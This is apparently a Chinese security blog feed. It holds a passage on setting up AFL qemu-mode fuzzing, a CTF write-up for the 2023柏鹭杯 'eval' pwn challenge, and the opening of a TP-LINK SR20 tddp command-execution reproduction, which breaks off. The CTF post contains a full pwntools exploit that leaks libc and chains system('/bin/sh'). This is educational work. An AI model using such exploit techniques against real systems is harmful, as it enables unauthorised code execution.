我宿主机也访问不到<br>进入build文件中 找到对应代码的位置<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251445451.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251445451.png" alt="image.png"></a><br>将QEMU_URL更改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz</span><br></pre></td></tr></table></figure><p>随后就可以正常下载了 接下来遇到的问题是其默认使用的是python 需求是python2<br>所以还需要加一个软连接 使python可以指向python2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/bin/python2.7 /usr/bin/python</span><br></pre></td></tr></table></figure><p>随后虽然可以正常执行一段时间 最后还是遇到了一个报错<br><strong>&#x2F;home&#x2F;chen&#x2F;AFL&#x2F;qemu_mode&#x2F;qemu-2.10.0&#x2F;linux-user&#x2F;syscall.c:261:16: error: static declaration of ‘gettid’ follows non-static declaration</strong><br>找到qemu-mode中的patches目录 更改syscall.diff文件内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--- qemu-2.10.0-clean/linux-user/syscall.c    2020-03-12 18:47:47.898592169 +0100</span><br><span class="line">+++ qemu-2.10.0/linux-user/syscall.c    2020-03-12 19:16:41.563074307 +0100</span><br><span class="line">@@ -34,6 +34,7 @@</span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line">+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988</span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line">@@ -116,6 +117,8 @@ int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line">+extern unsigned int afl_forksrv_pid;</span><br><span class="line">+</span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line">@@ -256,7 +259,9 @@ static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line">-_syscall0(int, gettid)</span><br><span class="line">+// taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+#define __NR_sys_gettid __NR_gettid</span><br><span class="line">+_syscall0(int, sys_gettid)</span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line">@@ -6219,7 +6224,8 @@ static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">-    info-&gt;tid = gettid();</span><br><span class="line">+    // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+    info-&gt;tid = sys_gettid();</span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line">@@ -6363,9 +6369,11 @@ static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line">-                put_user_u32(gettid(), child_tidptr);</span><br><span class="line">+                // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+                put_user_u32(sys_gettid(), child_tidptr);</span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line">-                put_user_u32(gettid(), parent_tidptr);</span><br><span class="line">+                // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+                put_user_u32(sys_gettid(), parent_tidptr);</span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line">@@ -11402,7 +11410,8 @@ abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line">-        ret = get_errno(gettid());</span><br><span class="line">+        // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+        ret = get_errno(sys_gettid());</span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>随后成功完成环境配置<br>更多报错可以参考该文章: <a href="https://blog.csdn.net/qysh123/article/details/114792891?utm_term=aflqemu%E6%A8%A1%E5%BC%8F&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-114792891&spm=3001.4430">https://blog.csdn.net/qysh123/article/details/114792891?utm_term=aflqemu%E6%A8%A1%E5%BC%8F&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-114792891&amp;spm=3001.4430</a><br>但是随后我们尝试使用-Q选项开始模糊测试 但是发现其找不到afl-qemu-trace<br>只需要添加环境变量AFL_PATH为afl目录的路径即可<br>这里还是使用上述的PUT进行测试 不过是用gcc将其编译<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251621751.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251621751.png" alt="image.png"></a><br>成功获取到两个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251622415.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251622415.png" alt="image.png"></a><br>不出所料 一个应该是canary导致的栈溢出 一个是因为我们既定的字符串触发的crash<br>接下来试着研究了下PUT输入样例的两个方式<br>一种是直接从stdin输入 像本篇文章一直使用的PUT那样<br>还有一种是从文件中输入 那么接下来就重写一个PUT来实现第二种<br>不过我们先来搞清楚第一种<br>官方文档中 记录的指令是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]</span><br></pre></td></tr></table></figure><p>[params]比较让我在意  这是否意味着不需要in目录? 可以直接从命令行输入测试样例<br>删除了in目录中的所有测试样例后 我想通过命令行向其传输aaa这个测试样例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251649438.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251649438.png" alt="image.png"></a><br>结果还是失败了 那么为了验证 命令行输入的测试样例究竟是否起到了作用 接下来做一个小测试<br>第一组我们的测试样例中不包含aaa 同时不通过命令行输入测试样例<br>第二组我们的测试样例保持不变 通过命令行输入测试样例aaa<br>对比两组的测试结果 如果第二组的crash除了栈溢出之外 还变异出了aaa 而第一组没有 那么就可以证明测试样例成功输入进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251653122.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251653122.png" alt="image.png"></a><br>测试样例两个 内容分别如上图<br>第一组跑出的crash中不含有aaaa<br>第二组含有 那么可以证实测试样例确实是传入了<br>接下来研究一下从文件中写入的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd = open(&quot;flag&quot;,0);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(fd,buf,0x20);</span><br><span class="line">    char buf1[0x20] = &quot;aaaa&quot;;</span><br><span class="line">    if(!strcmp(buf,buf1))&#123;</span><br><span class="line">        puts(&quot;success!&quot;);</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        puts(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令 这里考虑到了canary带来的crash太讨厌了  所以直接关掉了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-gcc -o test1 -no-pie -fno-stack-protector -g ./test1.c</span><br></pre></td></tr></table></figure><p>本次提供给模糊器的测试样例就一个aaa<br>然后由于是从文件读取输入 并且你可以看到上面的代码 我们是指定了所需的文件名 同时目录应该是位于当前PUT下<br>所以我们除了使用@@标识当前使用文件输入外 还需要使用-f指定对应路径下的文件名<br>不过我试了下 把@@删了也是可以的 可能是-f就自动默认了?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz/in -o ./fuzz/out -f ./flag ./test1 @@</span><br></pre></td></tr></table></figure><p>成功找到一个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310252233114.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310252233114.png" alt="image.png"></a><br>查看了内容 没错是我们预设的aaaa</p><h1 id="fuzz实际利用"><a href="#fuzz实际利用" class="headerlink" title="fuzz实际利用"></a>fuzz实际利用</h1><p>接下来准备尝试 使用fuzz来对一些开源的知名项目进行测试 以此来熟悉fuzz实际利用的操作<br>这里使用upx upx是一款可执行文件压缩工具 <a href="https://github.com/upx/upx#">https://github.com/upx/upx#</a><br>upx使用的压缩算法涉及到了ucl 所以还要先安装ucl</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir fuzz-upx</span><br><span class="line">git clone https://github.com/upx/upx.git</span><br><span class="line">wget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gz</span><br><span class="line">tar zxvf ucl-1.03.tar.gz</span><br><span class="line">cd ucl-1.03</span><br><span class="line">./configure CPPFLAGS=&quot;$CPPFLAGS -std=c90 -fPIC&quot;</span><br><span class="line"></span><br><span class="line">cd upx</span><br><span class="line">export CC=/usr/local/bin/afl-gcc </span><br><span class="line">export CXX=/usr/local/bin/afl-g++</span><br><span class="line">export UPX_UCCLDIR=&quot;/home/chen/fuzz-upx/ucl-1.03&quot;</span><br><span class="line">export UPX_LZMADIR=&quot;/home/chen/fuzz-upx/upx/vendor/lzma-sdk/&quot;</span><br><span class="line">上面这一步要注意一下  upx高版本和低版本的lzma-sdk存放位置不同 我的指令是高版本的</span><br><span class="line">make all</span><br><span class="line"></span><br><span class="line">在.bashrc文件中加上</span><br><span class="line">export PATH=$PATH:/home/chen/fuzz-upx/upx/build/release</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>在开始对upx模糊测试之前 我们不能像之前一样随便给几个样本 样本收集对于fuzz来说至关重要</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <id>http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</id>
    <published>2023-10-13T12:07:16.000Z</published>
    <updated>2024-09-20T09:16:23.511Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力<br>我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审</p><p>同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题</p><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[160]; // [rsp+10h] [rbp-1B0h] BYREF</span><br><span class="line">  char v5[264]; // [rsp+B0h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+1B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  while ( recv_data(v5, 0x100uLL) )</span><br><span class="line">    vuln(v5, v4);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数就是清空缓冲区以及设置闹钟 同时使用了一个while循环<br>先跟进一下recv_data这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_9D6(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  char buf; // [rsp+1Fh] [rbp-11h] BYREF</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  memset(a1, 0, a2);</span><br><span class="line">  while ( a2 &gt; v6 + 1 &amp;&amp; read(0, &amp;buf, 1uLL) != -1 &amp;&amp; buf != 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !check_opt(buf) &amp;&amp; !check_number(buf) )</span><br><span class="line">      error();</span><br><span class="line">    v3 = v6++;</span><br><span class="line">    *(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过单次输入一个字节 随后对该字节进行判断 是否为数字或者运算符 然后存储到a1中<br>随后来看一下vuln函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall vuln(__int64 buf, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; // [rsp+1Fh] [rbp-11h]</span><br><span class="line">  __int64 buf2; // [rsp+20h] [rbp-10h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(a2, 0, 0xA0uLL);</span><br><span class="line">  buf2 = buf;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(buf + i);</span><br><span class="line">    if ( !check_opt(v3) )                       // 如果不是opt就返回0 即退出for循环</span><br><span class="line">      break;</span><br><span class="line">    deal_number(a2, buf2, i + buf);</span><br><span class="line">    if ( !check_number(*(i + 1 + buf)) )</span><br><span class="line">      error();</span><br><span class="line">    sub_CB1(a2, v3);</span><br><span class="line">    buf2 = i + 1 + buf;</span><br><span class="line">LABEL_8:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    goto LABEL_8;</span><br><span class="line">  deal_number(a2, buf2, i + buf);</span><br><span class="line">  while ( *a2 )</span><br><span class="line">    calc(a2);</span><br><span class="line">  return printf(&quot;%ld\n&quot;, a2[a2[3] + 3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的逻辑稍微复杂一点<br>仍然是一个逐字节处理 只有是操作符才能执行for循环中的函数<br>来跟进一下deal_number函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_BYTE *__fastcall sub_DC9(__int64 a1, const char *buf2, _BYTE *opt)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rcx</span><br><span class="line">  char old_opt; // [rsp+27h] [rbp-9h]</span><br><span class="line">  _BYTE *first_number; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *buf2 == &#x27;0&#x27; )</span><br><span class="line">    error();</span><br><span class="line">  old_opt = *opt;</span><br><span class="line">  *opt = 0;</span><br><span class="line">  first_number = strtol(buf2, 0LL, 10);</span><br><span class="line">  result = opt;</span><br><span class="line">  *opt = old_opt;</span><br><span class="line">  if ( first_number )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(a1 + 24);</span><br><span class="line">    *(a1 + 24) = v4 + 1;</span><br><span class="line">    v5 = v4 + 4;</span><br><span class="line">    result = first_number;</span><br><span class="line">    *(a1 + 8 * v5) = first_number;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断了是否为0 是则终止程序<br>随后利用strtol将字符串转化为长整型 存储在a1+32处 同时a1+24处自增1 当然这是第一次处理的情况 后面由于a1+24的值不为0了  所以数字存储的地址也会相应增加一个字长<br>sub_cb1函数是一个对于运算符的检查以及筛分后运算</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_CB1(_QWORD *a1, char opt)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (*a1)++;</span><br><span class="line">    *(a1 + result + 8) = opt;</span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( opt != &#x27;+&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( opt &lt;= &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )                         // 这边是*的跳转</span><br><span class="line">LABEL_16:</span><br><span class="line">        error();</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( opt != &#x27;-&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;/&#x27; )</span><br><span class="line">        goto LABEL_16;</span><br><span class="line">LABEL_8:</span><br><span class="line">      if ( sub_91A(*(a1 + *a1 + 7)) )           // *(a1 + *a1 + 7)也就是运算符 sub_91A用来进一步检查是否为*和/</span><br><span class="line">        calc(a1);</span><br><span class="line">      if ( *a1 &gt; 0xEuLL )</span><br><span class="line">        error();</span><br><span class="line">      result = (*a1)++;</span><br><span class="line">      *(a1 + result + 8) = opt;</span><br><span class="line">      return result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  calc(a1);</span><br><span class="line">  if ( *a1 &gt; 0xEuLL )</span><br><span class="line">    error();</span><br><span class="line">  result = (*a1)++;</span><br><span class="line">  *(a1 + result + 8) = opt;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后calc函数应该很容易就能看出来是干啥的 这里的a1数组后面我们再仔细分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_QWORD *__fastcall sub_AC7(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line">  int opt; // eax</span><br><span class="line"></span><br><span class="line">  result = *a1;</span><br><span class="line">  if ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    opt = *(a1 + --*a1 + 8);</span><br><span class="line">    if ( opt == &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[a1[3] + 2] += a1[a1[3] + 3];           // a1[a1[3] + 2]为第一个number</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( opt &gt; &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt == &#x27;-&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        a1[a1[3] + 2] -= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( opt != &#x27;/&#x27; )</span><br><span class="line">LABEL_15:</span><br><span class="line">          error();</span><br><span class="line">        if ( !a1[a1[3] + 3] )</span><br><span class="line">          error();</span><br><span class="line">        a1[a1[3] + 2] /= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )</span><br><span class="line">        goto LABEL_15;</span><br><span class="line">      a1[a1[3] + 2] *= a1[a1[3] + 3];</span><br><span class="line">    &#125;</span><br><span class="line">    result = a1;</span><br><span class="line">    --a1[3];</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上面的分析 我们大概可以推理出这样一个大概的流程<br>比如 输入1+2<br>首先针对1进行判断 非运算符 所以跳出for循环 但是执行到下面的if的时候 又跳回到了if循环中<br>此时i自增1 也就是判断下一个字符 即+<br>+可以通过判断 此时第一次执行deal_number函数<br>而其第二个参数buf2 此时仍然执行buf首地址 也就是第一个数字<br>于是这里就存储第一个数字到了a1数组中对应的地址 也就是a1+32<br>随后检查下一个字符是否为数字 如果不是则终止程序<br>同时更改了buf2 使其指向2数字位于的地址<br>随后就因为第四个字节为空 此时就算真正跳出了for循环<br>此时再次执行deal_number 也就是对于第二个数字进行存储<br>随后进入calc函数执行操作<br>这里的a1[a1[3] + 2] 我们拆开分析 a1[3]显然是deal_number函数中的v4 在执行两次后 其变成了2 而最后得到的a1[4]就是第一个数字存储的地址 第二个则为a1[5]<br>完整的一个流程应该是这样的 看起来没有什么可以利用的漏洞点<br>但是如果我们输入的是+52会怎么样<br>其会直接进入if分支 随后执行deal_number函数 而此时的buf2指向的是运算符<br>而strtol函数是无法转化运算符的 也就是说其返回值为空 那么第一个数字的存储就失败了<br>随后只会存储52这个数字到a2+32的位置<br>随后执行到calc函数的时候 由于a2[3]此时才为1 所以就相当于a2[3]被增加到了53<br>而最后的printf语句就是根据a2[3]来索引的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;%ld\n&quot;, a2[a2[3] + 3])</span><br></pre></td></tr></table></figure><p>所以漏洞就出现在这里 可以实现一个栈上内容的泄露<br>泄露出libc_start_main的地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" alt="image.png"></a><br>在得到了libc地址后  我们可以利用同样的办法来操控a2[3]的值 同时可以利用deal_number函数中的strtol函数把str型的system这类地址 转化到栈上 从而可以构建出一条执行链 随后输入空字符 就可以跳出while循环 从而使程序执行到leave ret<br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">#io = remote(&quot;121.12.85.23&quot;,50532)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">#context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;+52&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(&quot;\n&quot;,drop = True),10)-0x24083</span><br><span class="line"></span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc.address))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;+54+&quot;+str(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = &quot;+53+&quot;+str(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">rdi_addr = libc.address + 0x0000000000023b6a</span><br><span class="line"></span><br><span class="line">payload = &quot;+52+&quot;+str(rdi_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">ret_addr = rdi_addr+1</span><br><span class="line"></span><br><span class="line">payload = &quot;+51+&quot;+str(ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1054)&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>TP-LINK SR20漏洞复现</title>
    <link href="http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-10-08T08:50:13.000Z</published>
    <updated>2023-10-12T15:41:41.559Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个涉及到了通信协议的洞 还是比较有趣的  以此来顺便丰富一下对于协议洞的认知<br>固件下载地址: <a href="https://www.tp-link.com/us/support/download/sr20/#Firmware">https://www.tp-link.com/us/support/download/sr20/#Firmware</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本质上是一个任意命令执行 不过传入的方式和以前复现过的不一样在于 是通过recvform接收到了对应端口传输的数据<br>找到官方报告中 漏洞位于的&#x2F;usr&#x2F;bin&#x2F;tddp文件<br>是32位的arm架构<br>ida打开后没有找到main函数 通过start函数来索引到main函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // r3</span><br><span class="line">  int v4; // r0</span><br><span class="line">  int v6; // [sp+Ch] [bp-8h]</span><br><span class="line">  int v7; // [sp+Ch] [bp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = mem_calloc(argc, argv, envp);</span><br><span class="line">  if ( v6 )</span><br><span class="line">    return v6;</span><br><span class="line">  v4 = sub_936C();</span><br><span class="line">  v7 = delete_mem(v4);</span><br><span class="line">  if ( v7 )</span><br><span class="line">    v3 = v7;</span><br><span class="line">  else</span><br><span class="line">    v3 = 0;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有三个函数 首尾两个函数的作用我已经更改了函数名 就是简单的开辟空间和释放空间<br>重点跟进一下936c这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_936C()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // r4</span><br><span class="line">  int optval; // [sp+Ch] [bp-B0h] BYREF</span><br><span class="line">  int v3; // [sp+10h] [bp-ACh] BYREF</span><br><span class="line">  struct timeval timeout; // [sp+14h] [bp-A8h] BYREF</span><br><span class="line">  fd_set readfds; // [sp+1Ch] [bp-A0h] BYREF</span><br><span class="line">  _DWORD *v6; // [sp+9Ch] [bp-20h] BYREF</span><br><span class="line">  int v7; // 